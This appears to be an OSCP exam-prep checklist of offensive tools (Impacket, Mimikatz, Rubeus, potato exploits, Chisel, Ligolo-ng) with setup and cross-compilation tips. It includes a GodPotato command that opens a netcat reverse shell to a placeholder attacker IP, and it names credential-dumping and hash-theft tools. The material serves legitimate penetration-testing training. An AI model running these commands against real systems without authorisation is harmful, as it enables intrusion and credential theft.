# OSCP Required Tools & Operational Guide

This is the consolidated master list of all tools mentioned in your notes. Use this as a checklist for your toolkit and a guide for pre-flight configurations.

---

## 1. Active Directory (Heavy Hitters)

### **Checklist**
- [ ] **Impacket Suite**: `secretsdump`, `ntlmrelayx`, `mssqlclient`, `getST`, `ticketer`, `GetNPUsers`, `GetUserSPNs`.
- [ ] **NetExec (nxc)**: `apt install netexec` (Multi-protocol enumeration).
- [ ] **Certipy**: `pip3 install certipy-ad` (AD CS Exploitation).
- [ ] **BloodHound & SharpHound**: Attack path mapping (GUI + data collector).
- [ ] **Rubeus.exe**: The Kerberos Swiss Army Knife.
- [ ] **Mimikatz.exe**: Credential dumping.
- [ ] **Kerbrute**: Pre-auth user enumeration.
- [ ] **PyWhisker / Whisker**: Shadow Credentials exploitation.
- [ ] **BloodyAD**: AD object and permission manipulation.

### **Usage & Setup Tips**
*   **Impacket (Kerberos)**: You **MUST** sync your time with the DC or Kerberos will error.
    *   `sudo ntpdate [DC_IP]`
*   **Certipy**: Relies on hostnames to resolve the CA. Add to `/etc/hosts`:
    *   `[DC_IP]  [DOMAIN_NAME] [CA_HOSTNAME] [CA_HOSTNAME].[DOMAIN_NAME]`
*   **Responder**: Disable the SMB/HTTP servers in `/etc/responder/Responder.conf` if you plan to run `impacket-smbserver` or `python server` simultaneously.
*   **Rubeus.exe**: Must match the target's .NET version. Keep two versions: one for .NET 3.5 and one for 4.5.
*   **BloodHound**: Start the Neo4j database first: `sudo neo4j start`.

---

## 2. Windows Privilege Escalation (.exe)

### **Checklist**
- [ ] **PrintSpoofer.exe**: SeImpersonate abuse for Windows 2016 / 2019.
- [ ] **GodPotato.exe**: SeImpersonate abuse for Win 11 / Server 2022.
- [ ] **SeManageVolumeExploit.exe**: Full C:\ drive permissions (SeManageVolumePrivilege).
- [ ] **SharpGPOAbuse.exe**: Abusing GPO Write permissions.
- [ ] **WinPEASany.exe**: Best-in-class automated enumeration.
- [ ] **PsExec.exe**: Sysinternals lateral movement.
- [ ] **nc.exe / ncat**: Reliable reverse shells.

### **Usage & Setup Tips**
*   **GodPotato**: Requires a command to execute.
    *   `GodPotato.exe -cmd "nc.exe -e cmd.exe [KALI_IP] 443"`
*   **SharpGPOAbuse**: You need the *exact* name of the GPO (found via BloodHound or `Get-GPO -All`).
*   **SeManageVolume**: Requires compiling the DLL and the EXE separately (see Compilation section).

---

## 3. Web & Initial Access

### **Checklist**
- [ ] **ffuf / Gobuster**: High-speed fuzzing and discovery.
- [ ] **Cadaver**: Command-line WebDAV client for PUT/MOVE.
- [ ] **Nikto**: Basic vulnerability scanner.
- [ ] **ntlm_theft.py**: Generator for hash-theft files (.lnk, .scf, .url).

### **Usage Tips**
*   **Fuzzing**: Always try both Directory and VHost fuzzing if a web service is found.
*   **WebDAV**: If `cadaver` reveals write access, upload a `.txt` first to test filters before a shell.

---

## 4. Pivoting & Tunneling

### **Checklist**
- [ ] **Chisel**: Fast, multi-platform TCP tunnels.
- [ ] **Ligolo-ng**: TUN-based pivoting (allows `nmap` through the tunnel).
- [ ] **Socat**: Relaying shells and ports.
- [ ] **Strings.exe**: For quick strings extraction on binaries.

### **Usage & Setup Tips**
*   **Ligolo-ng**: You must create the TUN interface on Kali first.
    *   `sudo ip tuntap add user [KALI_USER] mode tun ligolo`
    *   `sudo ip link set ligolo up`
    *   `sudo ip route add [INTERNAL_SUBNET] dev ligolo`
*   **Chisel**: Ensure your Kali firewall allows the listening port (usually 8080).

---

## 🛠️ Cross-Compilation Cheat Sheet (Kali to Windows)

**Target 64-bit Windows:**
```bash
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32
```

**Target 32-bit Windows:**
```bash
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32
```

**Making a DLL:**
```bash
x86_64-w64-mingw32-gcc -shared -o output.dll input.c
```

---

## ⚙️ Mandatory Kali Environment Setup
1.  **[/etc/hosts]**: Map IP to Hostname/Domain for Kerberos/ADCS.
2.  **[/etc/proxychains.conf]**: Ensure `socks5 127.0.0.1 1080` check for pivoting.
3.  **[Tool Directory]**: Standardize your folders (e.g., `~/tools/linux`, `~/tools/windows`).
4.  **[NTP Sync]**: Always sync time with Domain Controllers.
